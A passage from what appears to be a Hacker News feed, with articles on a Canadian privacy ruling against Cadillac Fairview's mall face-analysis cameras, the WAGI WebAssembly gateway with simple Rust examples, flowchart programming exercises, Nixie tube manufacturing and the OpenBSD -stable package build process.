create a biometric representation of their face, which is sensitive personal information, or for that biometric information to be used to guess their approximate age and gender," they wrote.</p>  <p>The privacy watchdogs also took issue with the way the&nbsp;five&nbsp;million images were stored.</p>  <p>Cadillac Fairview&nbsp;said the&nbsp;images taken by camera were briefly analyzed then deleted&nbsp;‚Äî&nbsp;but investigators found that the sensitive biometric information generated from the images was being stored in a centralized database by&nbsp;a third-party company,</p>  <p>"Our investigation revealed that&nbsp;[Cadillac Fairview Corporation Limited's]&nbsp;AVA&nbsp;service provider had collected and stored approximately five million numerical representations of faces on&nbsp;CFCL's behalf, on a decommissioned server, for no apparent purpose and with no justification," notes the investigation.</p>  <p>"Cadillac Fairview stated that it was unaware that the database of biometric information existed, which compounded the risk of potential use by unauthorized parties or, in the case of a data breach, by malicious actors."</p>  <h2>Company&nbsp;says technology couldn't identify people</h2>  <p>The company said the technology was used&nbsp;to detect the presence of a human face and&nbsp;assign it&nbsp;"within milliseconds"&nbsp;to an approximate age and gender category and maintains it&nbsp;did not store any images during the pilot program and was not capable of recognizing anyone.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/eaton-centre-decal.jpg 300w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/eaton-centre-decal.jpg 460w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/eaton-centre-decal.jpg 620w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg 780w,https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/eaton-centre-decal.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5782324.1604000638!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/eaton-centre-decal.jpg"></p></div><figcaption>The decal found on the entrance doors of the CF Toronto Eaton Centre<!-- --> <!-- -->(Office of the Privacy Commissioner report)</figcaption></figure></span></p>  <p>"The five million representations referenced in the [Office of the Privacy Commissioner]&nbsp;report are not faces. These are sequences of numbers the software uses to anonymously categorize the age range and gender of shoppers in the camera's view," Cadillac Fairview spokesperson Jess Savage&nbsp;said in a statement to CBC News.</p>  <p>"The&nbsp;OPC report concludes there is no evidence that CF was using any technology for the purpose of identifying individuals."</p>  <p>CF&nbsp;suspended its&nbsp;use of cameras&nbsp;back in 2018&nbsp;when provincial and federal privacy commissioners launched their probe&nbsp;<a href="https://www.cbc.ca/news/canada/calgary/calgary-malls-1.4760964">following a CBC investigation</a>.</p>  <p>In a statement to CBC News on Thursday, the company said it has deleted the data.</p>  <p>"We subsequently deactivated directory cameras and the numerical representations and associated data have since been deleted," said&nbsp;Savage.</p>  <p>"We take the concerns of our visitors seriously and wanted to ensure they were acknowledged and addressed."</p>  <p>However, the three commissioners said they have concerns about the company's plans going forward.</p>    <p>"The commissioners remain concerned that Cadillac Fairview refused their request that it commit to ensuring express, meaningful consent is obtained from shoppers should it choose to redeploy the technology in the future," said&nbsp;the commissioners'&nbsp;statement.</p>  <h2>No fines under Canadian law</h2>  <p>Savage said Cadillac Fairview&nbsp;accepted and implemented all the recommendations&nbsp;"with the exception of those that speculate about hypothetical future uses of similar technology."</p>  <p>The investigation found the technology was used&nbsp;in five provinces&nbsp;at the following malls:</p>  <ul>   <li>CF Market Mall (Calgary)</li>   <li>CF Chinook Centre (Calgary)</li>   <li>CF Richmond Centre (Richmond, B.C.)</li>   <li>CF Pacific Centre (Vancouver)</li>   <li>CF Polo Park (Winnipeg)</li>   <li>CF Toronto Eaton Centre (Toronto)</li>   <li>CF Sherway Gardens (Toronto)</li>   <li>CF Fairview Mall (Toronto)</li>   <li>CF Lime Ridge (Hamilton, Ont.)</li>   <li>CF Markville Mall (Markham, Ont.)</li>   <li>CF Galeries d'Anjou&nbsp;(Montreal)</li>   <li>CF Carrefour Laval (Laval, Que.)</li>  </ul>  <p>Ann Cavoukian,&nbsp;executive director at the Global Privacy and Security by Design Centre,&nbsp;said a case like this would lead to millions of dollars in fines if it had happened&nbsp;in the United States.</p>  <p>"The commissioners are doing the best they can with the limited resources they have," she said.</p>  <p>"What we have to insist upon is that private&nbsp;sector entities like Cadillac Fairview step up and protect their customers' privacy. Otherwise, why are the customers going to continue shopping there?"</p>  <p>B.C. Information and Privacy Commissioner&nbsp;Michael McEvoy&nbsp;said&nbsp;the fact he and his counterparts can't issue a fine in a&nbsp;case like this should make the case for stronger powers at both the federal and provincial levels.</p>  <p>"Fines in a case like this would have been a consideration. It is an incredible shortcoming of Canadian law," he said.</p>  <p>"We as privacy regulators don't have any authority to levy fines on companies that violate peoples'&nbsp;personal information and that should really change."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944486</guid>
            <pubDate>Fri, 30 Oct 2020 17:15:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WAGI: The Easiest Way to Build WebAssembly Microservices]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944429">thread link</a>) | @gabrtv
<br/>
October 30, 2020 | https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/ | <a href="https://web.archive.org/web/*/https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>A few months ago we released <a href="https://github.com/deislabs/krustlet">Krustlet</a>, a Kubernetes Kubelet that executes WebAssembly payloads instead of Docker containers</p>

<p>Today, we are open sourcing another experimental WebAssembly effort: the <a href="https://github.com/deislabs/wagi">WebAssembly Gateway Interface (WAGI)</a>. Pronounced ‚Äúwaggy‚Äù (and inspired by <a href="https://deislabs.io/images/moar_puppy.jpg">some</a> of the <a href="https://deislabs.io/images/puppy.jpg">puppies</a> on our team), WAGI is the easiest way to build WebAssembly microservices.</p>

<p>WAGI is for writing HTTP response handlers. It uses the <a href="https://wasi.dev/">WASI</a> POSIX-like system to expose an HTTP request to a WebAssembly module. Rather than requiring developers to learn new frameworks or work directly with network sockets, WAGI uses basic features like environment variables and files.</p>

<blockquote>
<p>What does it mean to be an ‚Äúexperimental‚Äù project? DeisLabs does a fair amount of R&amp;D. These projects aren‚Äôt likely to be the <em>next Helm</em>, but we hope that releasing them will be useful to others working in the same space.</p>
</blockquote>

<h2 id="writing-hello-world-for-wagi">Writing ‚ÄúHello World‚Äù for WAGI</h2>

<p>The best way to get started is to look at a simple ‚ÄúHello World‚Äù example. You can write WAGI scripts in any language that can compile to WASM32-WASI. Here we will give an example from Rust.</p>

<pre><code>fn main() {
    println!("Content-Type: text/plain");
    println!();
    println!("Hello world");
}
</code></pre>

<p>That‚Äôs it. You don‚Äôt need so much as an import. No external dependencies, no elaborate frameworks‚Ä¶ just write some data to standard output.</p>

<p>When it comes to WAGI modules, there are only a few things to know:</p>

<ul>
<li>Write output to STDOUT</li>
<li>Read environment variables for request information</li>
<li>Accept uploads through STDIN</li>
</ul>

<h3 id="writing-output">Writing Output</h3>

<p>Sending data to a web client is as easy as writing to <code>STDOUT</code>. Like a regular HTTP message, there are two parts to a WAGI response:</p>

<ul>
<li>A set of headers, which must contain either a <code>content-type</code> or a <code>location</code>.</li>
<li>A body</li>
</ul>

<p>Between the two is an empty line. Our Rust code above sent this to <code>STDOUT</code>:</p>

<pre><code>Content-Type: text/plain

Hello world
</code></pre>

<p>While there are a few other headers you can set, the only one you need is <code>Content-Type</code> (which is not case-sensitive).</p>

<p>In most languages, writing to standard output is built in to the core libraries, making it easy to write responses.</p>

<h3 id="using-environment-variables">Using Environment Variables</h3>

<p>An incoming HTTP request also has headers. A typical HTTP request looks something like this:</p>

<pre><code>GET /hello?greet=matt HTTP/1.1
Host: foo.example.com
User-Agent: curl/7.64.1
Accept: */*

</code></pre>

<p>When WAGI gets a request, it parses the header into environment variables. Here‚Äôs a quick WAGI module that prints out all of the environment variables. Again, it‚Äôs in Rust, but we could use other languages to do this.</p>

<pre><code>fn main() {
    println!("Content-Type: text/plain");
    println!("\n### Env Vars ###");
    std::env::vars().for_each(|v| {
        println!("{} = {}", v.0, v.1);
    });
}
</code></pre>

<p>The output of the above will show a list of environment variables, which will look something like this:</p>

<pre><code>HTTP_HOST = foo.example.com
SERVER_NAME = foo.example.com
SERVER_SOFTWARE = WAGI/1
GATEWAY_INTERFACE = CGI/1.1
HTTP_USER_AGENT = curl/7.64.1
X_FULL_URL = http://foo.example.com/hello?greet=matt
REQUEST_METHOD = GET
SERVER_PROTOCOL = http
PATH_INFO = /env
HTTP_ACCEPT = */*
SERVER_PORT = 80
PATH_TRANSLATED = /env
QUERY_STRING = greet=matt
</code></pre>

<p>Note that WAGI did quite a bit of processing for you. Frequently, a web app needs to parse the URL or get the HTTP method. WAGI breaks down the information and puts them in separate environment variables so that you don‚Äôt need to worry about it.</p>

<p>Then, from inside a WebAssembly module, you can just use the built-in language features to access the environment variables. For example, in <a href="https://www.assemblyscript.org/">AssemblyScript</a> (a relative of TypeScript) your code might look something like this:</p>

<pre><code>// Get a handle to the environment variables.
let env = new Environ();

// Get the 'Host' header from the HTTP request.
let host = env.get("HTTP_HOST");
</code></pre>

<p>A similar feature in Rust would be:</p>

<pre><code>let host = std::env::var("HTTP_HOST").unwrap();
</code></pre>

<p>Environment variables are a great way to pass information into a WebAssembly module because they are so easy to access using the libraries that ship with our programming languages.</p>

<h3 id="accepting-uploads-through-stdin">Accepting Uploads through <code>STDIN</code></h3>

<p>When an HTTP client sends a <code>POST</code> or <code>PUT</code> request, the client sends a message in the request body. Sometimes this is text. Other times it is a binary file, such as an image.</p>

<p>With WAGI, this information is sent to the WebAssembly module on Standard Input (<code>STDIN</code>). <code>STDIN</code> is a special file handle. It can be read using the normal file utilities.</p>

<p>Here is a simple Rust WAGI module that echos back the content type and the file contents that the client sent:</p>

<pre><code>use std::env::var;
use std::io::{copy, stdin, stdout};

fn main() {
    // Get the content type from the request and echo it
    let default_type = "text/plain".to_string();
    let content_type = var("HTTP_CONTENT_TYPE").unwrap_or(default_type);

    // Echo the message back to the client
    println!("content-type: {}", content_type);
    println!();
    copy(&amp;mut stdin(), &amp;mut stdout());
}
</code></pre>

<p>That‚Äôs it! In a dozen lines of code using nothing but standard libraries, we built a simple echo WAGI module.</p>

<p>For more examples of WAGI modules, check out the list we maintain in the documentation for <a href="https://github.com/deislabs/wagi">the WAGI server</a>. We also put together a <a href="https://github.com/deislabs/env_wagi">Rust example module</a> that displays all of the features of WAGI.</p>

<h2 id="the-history-of-wagi-since-1996">The History of WAGI (Since 1996)</h2>

<p>Veteran web developers will take a look at this and recognize a common idiom. WAGI is based on another tremendously popular technology‚Äìone that dates back to the birth of the web.</p>

<p>In the mid 1990s, HTML pages were served statically. Authors wrote the HTML document, saved it to disk, and the web server just sent that document directly to the client.</p>

<p>But what if you wanted to execute some logic before sending the page back? That‚Äôs where Common Gateway Interface (CGI) came in. CGI defined a way to take an inbound request, break it into parts, and feed it to shell scripts. With CGI, one could use Bash, Perl, C-Shell, C, and any other language to write dynamic web pages.</p>

<p>CGI became a <em>de facto</em> standard (and later an <a href="https://tools.ietf.org/html/rfc3875">RFC</a>), with Apache and other web servers quickly adopting it. Perl and PHP both had early implementations of CGI. And many of the web‚Äôs first major applications were written as CGI scripts.</p>

<p>As WebAssembly has begun the long maturation process, the WebAssembly Systems Interface (WASI) has a securely sandboxed POSIX environment for WebAssembly modules.</p>

<p>So far, WASI provides access to environment variables, files on the file system (including STDIN and STDOUT), and a few other features. But it has no socket or HTTP support, and it is not yet multi-threaded.</p>

<p>How do you build an HTTP microservice without any networing access? Well, it turns out that CGI provided the answer: We could implement the CGI runtime and pass all the information into the module without needing to directly expose the WebAssembly module to networking. This is secure, convenient, and can be done without WebAssembly multithreading.</p>

<p>The WAGI server, written in Rust, provides a web server that answers requests. On each request, it loads the appropriate WebAssembly module, translates the HTTP request to a CGI request, and then runs the module. All of the threading and state management is handled in the WAGI server. A WAGI WebAssembly module just has to handle a single request.</p>

<p>We are excited about this because we have combined a venerable early web technology and aen emerging technology to provide a simple web service implementation. Will it be the ‚Äúfuture of WebAssembly‚Äù? Probably not. But it provides for us today a quick and easy way of writing WebAssembly microservices.</p>

<h2 id="what-s-the-deal-with-deislabs-and-webassembly">What‚Äôs the Deal with DeisLabs and WebAssembly?</h2>

<p>The DeisLabs team at Microsoft has been increasingly involved in the cloud-native side of WebAssembly. We‚Äôve been involved with ByteCode Alliance. We‚Äôve contributed patches and bugfixes to a number of WebAssembly projects. We‚Äôve written about WebAssembly. And we‚Äôve released some early experiments.</p>

<p>So what‚Äôs going on?</p>

<p>We suspect that WebAssembly‚Äìspecifically with WASI and other projects like waSCC‚Äìis poised to become a prominent technology in the cloud native space. Already, over a dozen languages have compilers that can produce WebAssembly binaries.</p>

<p>We see three major boons to WebAssembly.</p>

<ol>
<li>With its low overhead and small footprint, WebAssembly can achieve <strong>higher density in the datacenter</strong>. That means that the cost of cloud hosting goes down.</li>
<li>WebAssembly makes a fundamentally positive security assertion: The runtime cannot trust the binary it is executing. That is a perfect model for cloud computing. The default <strong>security posture of WebAssembly is already strong</strong>.</li>
<li>Because WebAssembly is <strong>architecture and operating system-neutral</strong>, the same binary (unaltered) can be run on Windows, Mac, and Linux; on Intel, ARM, and other architectures. No more recompiling for specific target platforms.</li>
</ol>

<p>We think WebAssembly has the potential for a very bright future in the datacenter, in the cloud, and on the edge. In the last few months, we‚Äôve tried some pretty out-there experiments. Many have failed. But some, like Krustlet and WAGI, are looking promising. We are hoping to build more open source tools for this space, and are eagerly looking forward to cooperating with others in the nascent WebAssembly ecosystem.</p>

<p>We‚Äôre already toying with some networking, nanoprocesses, and security tools. We hope to share these in the coming months.</p>

<p>We hope you have a good time playing with our WAGI tool. We certainly have enjoyed making it.</p>

      
      
    </div></div>]]>
            </description>
            <link>https://deislabs.io/posts/introducing-wagi-easiest-way-to-build-webassembly-microservices/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944429</guid>
            <pubDate>Fri, 30 Oct 2020 17:11:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Computer Programming with Flowcharts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944103">thread link</a>) | @jventura
<br/>
October 30, 2020 | https://fullspeedpython.com/blog/flowcharts/ | <a href="https://web.archive.org/web/*/https://fullspeedpython.com/blog/flowcharts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        
    <div>
        
        
            <p>
                October 30, 2020
            </p>
        
        <hr>
        <p>When I was a student back in the 90's, flowcharts were a widely used tool to teach students the basics of computer programming.
A flowchart is a diagram that represents all the necessary steps for solving a specific task.</p>
<p>In my opinion, beginner programmers should give flowcharts a chance as they provide a very simple learning model. And I think that, given the step-by-step nature of the flowchart, and with enough practice, it can give students a great confidence in their own skills. </p>
<p>Moving along.. </p>
<p>The following flowchart represents a simple program that asks the user for a number, stores it in a variable called "X", then adds 1 to "X", and finally prints the value of "X".</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart1.svg"></p>
<p>If you were to run this program and gave it the number 10, the program would output the number 11. If you gave it the number 20, it would output 21, and so on.</p>
<p>But computer programs can be more complex. For instance, the following flowchart represents a program that asks the user for a number, and checks if it is greater than 10.
If it is greater than 10, it writes "X is greater than 10", else it writes "X is <strong>not</strong> greater than 10".</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart2.svg"></p>
<p>With only these kind of blocks you can do a lot of things! Here's another program that asks the user for a number and writes "Hello World" that many times.</p>
<p><img src="https://fullspeedpython.com/static/blog/flowcharts/flowchart3.svg"></p>
<p>Basically, while X is greater than 0 it prints "Hello World" and subtracts 1. When X reaches 0 the program ends.</p>
<p>I will leave you with a couple of exercises that you can use to practice your flowcharts-fu!</p>
<h3>Basic exercises</h3>
<ol>
<li>Do a flowchart that places X=0 and then outputs it (this one's really basic).</li>
<li>Do a flowchart that ask the user for a number, multiplies it by 2 and then output it.</li>
<li>Do a flowchart that asks the user for two numbers (one at a time, you may call them X and Y), stores the sum in a variable Z, and outputs it.</li>
<li>Do a program that asks the user for two numbers (again, one at a time), and swaps the value of the variables (you may need a third temporary variable).</li>
<li>Do a program that asks the user for the number of hours, the price per hour and outputs how much is due.</li>
</ol>
<h3>Exercises with comparisons</h3>
<ol>
<li>Do a program that asks the user for two numbers and checks if they are equal or not. The program should write something like "the numbers are equal" or "the numbers are different".</li>
<li>Do a program that asks the user for two numbers and outputs the value of the larger one.</li>
<li>Do a program that asks the user for two numbers and outputs the value of the smaller one.</li>
<li>Do a program that asks for three numbers and outputs the value of the larger one.</li>
<li>Do a program that asks for three numbers, computes their average, and writes "Cold" if the average is less than 20. If it's greater or equal than 20, it should write "Warm".</li>
</ol>
<h3>Exercises with loops</h3>
<ol>
<li>Do a program that asks for a number <strong>X</strong> and writes "Hello World" <strong>X</strong> times (see above!).</li>
<li>Do a program that asks for a number <strong>X</strong> and sums all integers from <strong>X</strong> to 1. For instance, if X=4, it should do 4+3+2+1. <strong>Hint: keep the sum in another variable, and initialize it as 0.</strong></li>
<li>Do a program that asks for a number <strong>X</strong> and outputs the factorial of X. For instance, the factorial of 4 is 4x3x2x1.</li>
<li>Build a small program that implements the guess game. The program should ask user 1 for a number <strong>X</strong>. Then, user 2 must guess the number. The program must keep saying that the number <strong>Y</strong> (which is the number that user 2 inserts) is greater or smaller than <strong>X</strong>. The program should end when the numbers are equal. </li>
</ol>
<p><br>
Have fun!<br>
Jo√£o Ventura</p>
<p>PS: All flowcharts were made with <a href="https://app.diagrams.net/">https://app.diagrams.net/</a>.</p>
    </div>

    </div>
</section></div>]]>
            </description>
            <link>https://fullspeedpython.com/blog/flowcharts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944103</guid>
            <pubDate>Fri, 30 Oct 2020 16:45:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dalibor Farny manufactures new Nixie tubes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943931">thread link</a>) | @beervirus
<br/>
October 30, 2020 | https://www.daliborfarny.com/manufacture/ | <a href="https://web.archive.org/web/*/https://www.daliborfarny.com/manufacture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<!-- Google Tag Manager (noscript) -->

<!-- End Google Tag Manager (noscript) -->




<section>
	<p>
					 <video inline="" loop="" autoplay="" muted="" poster="https://www.daliborfarny.com/wp-content/uploads/2016/12/the-art-of-making.jpg">
				<source src="https://www.daliborfarny.com/wp-content/uploads/2016/12/the-art-of-making.mp4" type="video/mp4">
				Your browser does not support the video tag.
			</video> 
			</p>	
	
			
	</section>
<section id="cleaning">
					
		<div>
		<div>
			<p>01 / <span>06</span></p>
			<h2>Cleaning</h2>
			<p>
				Cleaning is an essential process of Nixie tube manufacture ‚Äì all the parts going inside the tube must be cleaned prior to assembly. This ensures they will not pollute the gas mixture in the tube and provide for long life-span. Cleaning may take 25 % of the total time of making the tube.			</p>
		</div>
	</div>
	
</section>
<section id="assembly">
	<img sizes="100vw" srcset="
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_360.jpg 360w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_649.jpg 649w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_868.jpg 868w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1049.jpg 1049w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1208.jpg 1208w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1359.jpg 1359w,
		https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1429.jpg 1429w" src="https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling/assembling_busknk_c_scale,w_1429.jpg" alt="Assembling table">
	<div>
		<p>02 / <span>06</span></p>
		<h2>Assembly</h2>
		<p><img sizes="(max-width: 1400px) 100vw, 1400px" srcset="
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_360.png 360w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_668.png 668w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_888.png 888w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1087.png 1087w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1252.png 1252w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1394.png 1394w,
				https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1526.png 1526w" src="https://www.daliborfarny.com/wp-content/themes/nixieclocks/assets/images/assembling-hands/assembling-hands_x2t45m_c_scale,w_1394.png" alt="Assembling hands" data-observe-visibility="">
		</p>
		<p>Assembly is the most time-consuming process, for it is very demanding on dexterity and patience. It takes more than half a year to fully train a worker.<br>
Besides putting parts together, the worker must be able to keep the right tension in the metal sheets and do precise spot welding. There are 41 parts and 26 spot welds necessary for a R|Z568M Nixie tube.</p>
	</div>
</section>
<div id="glass-work">
	<div>
		<p><img width="768" height="402" src="https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-768x402.jpg" alt="" sizes="(max-width: 1400px) 100vw, 1400px" srcset="https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-768x402.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-600x314.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1024x536.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1536x804.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-2048x1072.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-360x188.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-1320x691.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-400x209.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2018/04/glass-work-scaled.jpg 2560w"></p><div>
			<p>03 / <span>06</span></p>
			<h2>Glass work</h2>
			<p>Working with glass is both pleasure and pain. Every seal needs to be done just right, otherwise, the glass may crack, ruining all the work done. </p>
		</div>
	</div>
</div>
<section id="evacuation">
	<div>
		<div>
			<div>
				<p>04 / <span>06</span></p>
				<h2>Evacuation and burn-in process</h2>
			</div>
			<p>
					Evacuation is probably the most difficult process to understand because things just work differently at high vacuum levels. Each tube is filled with high purity noble gas to ensure long lifespan.				</p>
		</div>

				
	</div>
</section>
<section id="base">
	<div>
		<div>
			<div>
				<p>05 / <span>06</span></p>
				<h2>Attaching the base</h2>
				<p>When the evacuation and filling process is done, the tube will get its metal base. Now it is ready for testing.</p>
			</div>
			<p><a href="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-scaled.jpg" rel="lightbox-base" title="_LKJ3205">
					<img width="768" height="512" src="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-768x512.jpg" alt="" srcset="https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-768x512.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-600x400.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1024x683.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1536x1024.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-2048x1365.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-360x240.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-1320x880.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-400x267.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2013/10/LKJ3205-scaled.jpg 2560w" sizes="(max-width: 768px) 100vw, 768px">				</a>
			</p>
		</div>
	</div>
</section>
<section id="testing">
	<div>
		<p><img width="768" height="512" src="https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-768x512.jpg" alt="" sizes="(max-width: 1400px) 100vw, 1400px" srcset="https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-768x512.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-600x400.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1024x683.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1536x1024.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-2048x1365.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-360x240.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1320x880.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-400x267.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-scaled.jpg 2560w"></p><div>
			<p>06 / <span>06</span></p>
			<h2>Testing the tubes</h2>
			<p>When the tube is finished, we test it to detect potential errors.</p>
		</div>
	</div>
</section>
 
	
	





























<!-- WooCommerce JavaScript -->



</div>]]>
            </description>
            <link>https://www.daliborfarny.com/manufacture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943931</guid>
            <pubDate>Fri, 30 Oct 2020 16:30:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the OpenBSD -stable packages are built]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943808">thread link</a>) | @zdw
<br/>
October 30, 2020 | https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html | <a href="https://web.archive.org/web/*/https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article id="20201029">
  <header>
  
    
    <p>Written by <em>Sol√®ne</em>, on 29 October 2020.<br>Tags: 
<span><a href="https://dataswamp.org/~solene/tag-openbsd.html">#openbsd</a></span>

</p>
    
  </header>
  <p>In this long blog post, I will write about the technical details
of the OpenBSD stable packages building infrastructure. I have setup
the infrastructure with the help of Theo De Raadt who provided me
the hardware in summer 2019, since then, OpenBSD users can upgrade
their packages using <code>pkg_add -u</code> for critical updates that has
been backported by the contributors. Many thanks to them, without
their work there would be no packages to build. Thanks to pea@ who
is my backup for operating this infrastructure in case something
happens to me.</p>

<p><strong>The total lines of code used is around 110 lines of shell.</strong></p>

<h2 id="originaldesign">Original design</h2>

<p>In the original design, the process was the following. It was done
separately on each machine (amd64, arm64, i386, sparc64).</p>

<h3 id="updatingports">Updating ports</h3>

<p>First step is to update the ports tree using <code>cvs up</code> from a cron
job and capture its output. <strong>If</strong> there is a result, the process
continues into the next steps and we discard the result.</p>

<p>With CVS being per-directory and not using a database like git or
svn, it is not possible to ‚Äúpoll‚Äù for an update except by verifying
every directory if a new version of files is available. This check
is done three time a day.</p>

<h3 id="makealistofportstocompile">Make a list of ports to compile</h3>

<p>This step is the most complicated of the process and weights for a
third of the total lines of code.</p>

<p>The script uses <code>cvs rdiff</code> between the cvs release and stable
branches to show what changed since release, and its output is
passed through a few grep and awk scripts to only retrieve the
‚Äúpkgpaths‚Äù (the pkgpath of curl is <strong>net/curl</strong>) of the packages
that were updated since the last release.</p>

<p>From this raw output of cvs rdiff:</p>

<pre><code>File ports/net/dhcpcd/Makefile changed from revision 1.80 to 1.80.2.1
File ports/net/dhcpcd/distinfo changed from revision 1.48 to 1.48.2.1
File ports/net/dnsdist/Makefile changed from revision 1.19 to 1.19.2.1
File ports/net/dnsdist/distinfo changed from revision 1.7 to 1.7.2.1
File ports/net/icinga/core2/Makefile changed from revision 1.104 to 1.104.2.1
File ports/net/icinga/core2/distinfo changed from revision 1.40 to 1.40.2.1
File ports/net/synapse/Makefile changed from revision 1.13 to 1.13.2.1
File ports/net/synapse/distinfo changed from revision 1.11 to 1.11.2.1
File ports/net/synapse/pkg/PLIST changed from revision 1.10 to 1.10.2.1
</code></pre>

<p>The script will produce:</p>

<pre><code>net/dhcpcd
net/dnsdist
net/icinga/core2
net/synapse
</code></pre>

<p>From here, for each pkgpath we have sorted out, the sqlports database
is queried to get the full list of pkgpaths of each packages, this
will include all packages like flavors, subpackages and multipackages.</p>

<p>This is important because an update in <code>editors/vim</code> pkgpath will
trigger this long list of packages:</p>

<pre><code>editors/vim,-lang
editors/vim,-main
editors/vim,gtk2
editors/vim,gtk2,-lang
